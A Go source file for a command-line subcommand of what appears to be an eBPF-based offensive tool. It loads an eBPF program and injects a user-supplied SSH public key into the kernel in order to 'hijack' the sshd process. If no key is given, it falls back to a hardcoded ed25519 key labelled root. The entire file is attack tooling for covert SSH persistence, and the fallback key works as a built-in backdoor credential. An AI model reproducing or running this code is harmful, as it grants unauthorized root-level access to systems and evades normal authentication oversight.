package subCommand

import (
	ebpf "ebpf_common/pkg/ebpf-new"
	_ "embed"
	"github.com/AlecAivazis/survey/v2"
	log "github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
)

//go:embed description.txt
var Description string

var DemoCmd = &cobra.Command{
	Use:     "demo",
	Aliases: []string{"d"},
	Short:   Description,
	Long:    Description,
	Run: func(cmd *cobra.Command, args []string) {
		log.Info("Start ebpf runtime instance")
		e := ebpf.New()
		var err error
		err = e.CreateCiliumEBPFRuntime(false)
		if err != nil {
			log.Panicln(err)
		}
		defer func(e *ebpf.CiliumEBPFRuntime) {
			err := e.Close()
			if err != nil {
				log.Panicln(err)
			}
		}(e)
		err = e.CreateLink()
		if err != nil {
			log.Panicln(err)
		}
		log.Info("Injecting ebpf program into file system success.")
		err = e.SendKey(ReadInputAsKey())
		if err != nil {
			log.Panicln(err)
		}
		log.Info("Send to kernel mode successful")
	},
}

func ReadInputAsKey() (key string) {
	if err := survey.AskOne(&survey.Input{
		Message: "You need input a ssh key to send to hijack sshd process\n",
	}, &key); err != nil {
		return "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMzFePM0u92NjpCJ3TvGIY4CidzTTRoEzNdmLNUxcNNC root"
	}
	return
}
